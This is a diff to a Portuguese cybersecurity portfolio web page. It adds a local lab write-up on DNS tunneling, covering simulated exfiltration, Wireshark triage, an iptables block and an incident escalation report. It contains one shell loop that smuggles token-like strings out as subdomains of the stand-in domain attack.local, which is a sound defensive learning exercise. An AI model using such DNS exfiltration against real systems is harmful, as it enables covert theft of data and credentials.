@@ -100,7 +100,21 @@
                 <p class="project-card__summary">Identificação de serviços expostos e suas versões utilizando Nmap e como pode prejudicar empresas</p>
                 <span class="tag">VER DETALHES</span>
             </div>
+            <!-- ----- Projeto DNS Tunneling ----- -->
+            <div class="project-card" onclick="openModal('modalDNSTunneling')">
+                <div class="project-card__image-container">
+                    <picture>
+                        <source media="(min-width: 768px)" srcset="assets/projeto-DNS/telamaior.png">
+                        <img src="assets/projeto-DNS/telamenor.png" alt="Varredura Nmap Terminal" class="project-card__img">
+                    </picture>
+                </div>
+                <h3 class="project-card__title">DNS Tunneling</h3>
+                <p class="project-card__summary">Simulação de exfiltração de dados, triagem avançada de pacotes no Wireshark e mitigação via firewall.</p>
+                <span class="tag">VER DETALHES</span>
+            </div>
         </section>
+        <!-- ----- DEPOIS DE CLICAR ----- -->
+         <!-- PROJETO BRUTE FORCE -->
         <div id="modalBruteForce" class="modal">
             <div class="modal-content">
                 <span class="close" onclick="closeModal('modalBruteForce')">&times;</span>
@@ -239,6 +253,137 @@
                 </div>
             </div>
         </div>
+        <!-- DNS Tunneling -->
+        <div id="modalDNSTunneling" class="modal">
+            <div class="modal-content">
+                <span class="close" onclick="closeModal('modalDNSTunneling')">&times;</span>
+                <h2 class="modal-title">Simulação de DNS Tunneling: Exfiltração, Detecção e Escalonamento</h2>
+                
+                <div class="modal-section">
+                    <h3>Descrição do Projeto</h3>
+                    <p>Este projeto demonstra um laboratório prático focado nas atribuições reais de um **Analista de SOC Nível 1**. O objetivo principal foi simular um cenário real de exfiltração de dados corporativos utilizando o protocolo DNS de forma anômala, realizar a triagem profunda de pacotes utilizando o Wireshark, aplicar contramedidas imediatas de mitigação no firewall de host e documentar todo o processo através de um relatório formal de escalonamento de incidentes.</p>
+                    <p>A simulação e a captura foram realizadas inteiramente em um ambiente controlado local.</p>
+                    
+                    <p><strong>Ferramentas Utilizadas:</strong></p>
+                    <ul>
+                        <li><strong>Sistema Operacional:</strong> Linux Ubuntu (Ambiente de Análise)</li>
+                        <li><strong>Analisador de Protocolo:</strong> Wireshark (Captação e Inspeção de Tráfego)</li>
+                        <li><strong>Framework de Referência:</strong> MITRE ATT&CK (Tática: Comando e Controle / Exfiltração | Técnica: T1071.004)</li>
+                    </ul>
+                
+            </div>
+
+            <div class="modal-section">
+                <h3>Estrutura do Laboratório</h3>
+                <div style="background: #0d1117; padding: 15px; border-radius: 6px; border: 1px solid #21262d; font-family: monospace; font-size: 13px; color: #c9d1d9; line-height: 1.6;">
+                    <span style="color: #ff7b72;">[ 1. ATAQUE ]</span> ➡️ Execução de loops em terminal fatiando dados via consultas DNS.<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⬇️<br>
+                    <span style="color: #79c0ff;">[ 2. ANÁLISE ]</span> ➡️ Isolamento de assinaturas e payloads maliciosos no Wireshark.<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⬇️<br>
+                    <span style="color: #56d364;">[ 3. MITIGAÇÃO ]</span> ➡️ Bloqueio ativo no firewall barrando a exfiltração.<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⬇️<br>
+                    <span style="color: #e3b341;">[ 4. ESCALONAMENTO ]</span> ➡️ Relatório técnico para o time de Resposta a Incidentes.
+                </div>
+            </div>
+
+            <div class="modal-section" style="border-left: 4px solid #ff9e3b; padding-left: 15px; background: rgba(255,158,59,0.05);">
+                <h3>📋 Relatório de Escalonamento de Incidente</h3>
+                <p><strong>ID do Incidente:</strong> <code style="color: #ff9e3b;">INC-2026-0609</code><br>
+                <strong>Data/Hora:</strong> 09 de Junho de 2026, 11:55 UTC-3<br>
+                <strong>Severidade:</strong> Alta<br>
+                <strong>Status:</strong> Mitigado / Aguardando Resposta a Incidentes (N2)</p>
+            </div>
+
+            <div class="modal-section">
+                <h3>1. Sumário Executivo</h3>
+                <p>Durante o monitoramento de rotina na interface de rede Loopback (<code>lo</code>), foi identificado um comportamento altamente anômalo de tráfego UDP na porta 53, originado do host local (127.0.0.1). A análise de pacotes confirmou uma atividade de exfiltração de dados ativa através da técnica de **DNS Tunneling (MITRE ATT&CK T1071.004)**. Um script/comando automatizado fragmentou informações confidenciais corporativas e as embutiu como subdomínios destinados ao domínio externo fictício <code>attack.local</code>.</p>
+            </div>
+
+            <div class="modal-section">
+                <h3>2. Análise Técnica e Evidências</h3>
+                <p><strong>Testes Preliminares de Conectividade:</strong> Antes da automação do ataque, foram realizados testes manuais de resolução para validar o comportamento do protocolo utilizando um domínio de testes.</p>
+                
+                <p><strong>Execução do Script de Exfiltração (Ataque):</strong> O vetor de ataque definitivo utilizou consultas iterativas para enviar strings confidenciais, simulando um vazamento de credenciais em blocos de pacotes:</p>
+                
+                <div style="margin: 15px 0;">
+                    <pre style="background: #0d1117; padding: 12px; border-radius: 6px; border: 1px solid #21262d; overflow-x: auto;"><code style="color: #56d364; font-family: monospace;">for bloco in "token-acesso-fmu" "parte-2-sucesso" "fim-da-string"; do nslookup "$bloco.attack.local" 127.0.0.1; done</code></pre>
+                </div>
+
+                <p>Antes de haver um servidor ouvindo ou um bloqueio ativo, a aplicação recebia respostas imediatas do tipo <em>connection refused</em>, gerando pacotes de erro ICMP (<em>Port unreachable</em>) na rede, indicando que as consultas estavam de fato sendo empurradas para a camada de transporte, conforme registrado no terminal da vítima.</p>
+                
+                <div style="text-align: center; margin-top: 15px;">
+                    <!-- Espaço para print da validação/terminal do ataque -->
+                    <img src="assets/projeto-DNS/script.jpeg" alt="Execução do ataque no terminal" style="width: 100%; max-width: 600px; border: 1px solid var(--titulos-icones); border-radius: 4px; box-shadow: 0 0 10px rgba(0,255,65,0.1);">
+                </div>
+        </div>
+
+        <div class="modal-section">
+            <h3>3. Triagem e Assinaturas no Wireshark</h3>
+            <p>Diferente de consultas de navegação legítimas, o tráfego suspeito apresentou características clássicas de tunelamento:</p>
+            <ul>
+                <li><strong>Frequência Sequencial:</strong> Múltiplas queries consecutivas em um curtíssimo intervalo de tempo para a reconstrução do payload no destino.</li>
+                <li><strong>Indicadores de Comprometimento (IoCs) Capturados:</strong>
+                    <ul>
+                        <br>
+                        <li><code>token-acesso-fmu.attack.local</code></li>
+                        <li><code>parte-2-sucesso.attack.local</code></li>
+                        <li><code>fim-da-string.attack.local</code></li>
+                        <br>
+                    </ul>
+                </li>
+            </ul>
+
+            <p>Para isolar o tráfego malicioso e eliminar o ruído de fundo de serviços legítimos do sistema, foi empregado o seguinte filtro avançado de exibição na barra de ferramentas do Wireshark:</p>
+            <div style="margin: 15px 0;">
+                <pre style="background: #0d1117; padding: 12px; border-radius: 6px; border: 1px solid #21262d; overflow-x: auto;"><code style="color: #79c0ff; font-family: monospace;">dns.flags.response == 0 and dns.qry.name contains "attack.local"</code></pre>
+            </div>
+
+            <div style="text-align: center; margin-top: 15px;">
+                <!-- Espaço para o print do Wireshark mostrando os pacotes capturados antes da mitigação -->
+                <img src="assets/projeto-DNS/execucao-script.jpeg" alt="Captura do Tráfego Malicioso no Wireshark" style="width: 100%; max-width: 600px; border: 1px solid var(--titulos-icones); border-radius: 4px; box-shadow: 0 0 10px rgba(0,255,65,0.1);">
+            </div>
+        </div>
+
+        <div class="modal-section">
+            <h3>4. Ações de Contenção Imediata (Mitigação)</h3>
+            <p>Para estancar o vazamento e impedir a continuidade da exfiltração de dados confidenciais, foi aplicada uma regra restritiva de firewall (<code>iptables</code>) focada no protocolo, porta e destino mapeados:</p>
+            
+            <div style="margin: 15px 0;">
+                <pre style="background: #0d1117; padding: 12px; border-radius: 6px; border: 1px solid #21262d; overflow-x: auto;"><code style="color: #ff7b72; font-family: monospace;">sudo iptables -A OUTPUT -p udp --dport 53 -d 127.0.0.1 -j DROP</code></pre>
+            </div>
+
+            <p><strong>Validação da Eficácia da Defesa:</strong></p>
+            <ul>
+                <li><strong>Comportamento na Aplicação:</strong> Ao reexecutar o script de ataque, as consultas mudaram imediatamente de estado para <em>timed out</em>. Isso comprova que o firewall passou a descartar (DROP) os pacotes silenciosamente, impedindo-os de trafegar.
+                </li>
+                <div style="text-align: center; margin-top: 15px;">
+                    <img src="assets/projeto-DNS/firewall.jpeg" alt="Validação do bloqueio no Terminal e no Wireshark" style="width: 100%; max-width: 600px; border: 1px solid var(--titulos-icones); border-radius: 4px; box-shadow: 0 0 10px rgba(0,255,65,0.1);">
+                </div>
+                <li><strong>Comportamento na Rede:</strong> A inspeção contínua no Wireshark confirmou que o tráfego direcionado ao domínio <code>attack.local</code> cessou completamente, restando apenas requisições legítimas do sistema operacional.
+                </li>
+                <div style="text-align: center; margin-top: 15px;">
+                <img src="assets/projeto-DNS/resultado-final.jpeg" alt="Validação do bloqueio no Terminal e no Wireshark" style="width: 100%; max-width: 600px; border: 1px solid var(--titulos-icones); border-radius: 4px; box-shadow: 0 0 10px rgba(0,255,65,0.1);">
+                </div>
+            </ul>
+        </div>
+
+        <div class="modal-section">
+            <h3>5. Justificativa para Escalonamento (N1 para N2)</h3>
+            <p>O incidente foi classificado como **Verdadeiro Positivo** e foi escalonado para a equipe de Nível 2 devido aos seguintes fatores analíticos:</p>
+            <ol>
+                <li><strong>Confirmação de Vazamento Parcial:</strong> Uma análise cronológica prova que os primeiros blocos de informação trafegaram livremente pela interface de rede antes do acionamento e aplicação da regra de firewall pelo analista N1.</li>
+                <li><strong>Necessidade de Análise de Host:</strong> Como o escopo do Analista N1 limita-se à detecção e contenção perimetral/camada de rede, faz-se estritamente necessária uma investigação forense em nível de sistema operacional para determinar o vetor de infecção inicial e auditar possíveis persistências remanescentes criadas pelo atacante na máquina afetada.</li>
+            </ol>
+        </div>
+
+        <div class="modal-section" style="margin-top: 25px; text-align: center;">
+            <!-- Ajuste o link do repositório se necessário -->
+            <a href="https://github.com/mttsdev/DNS-Tunneling" target="_blank" class="btn-cv">
+                <i class="fab fa-github"></i> Acessar Repositório
+            </a>
+        </div>
+    </div>
+    </div>
 
         <!-- SKILLS -->
         <section id="skills" class="section">
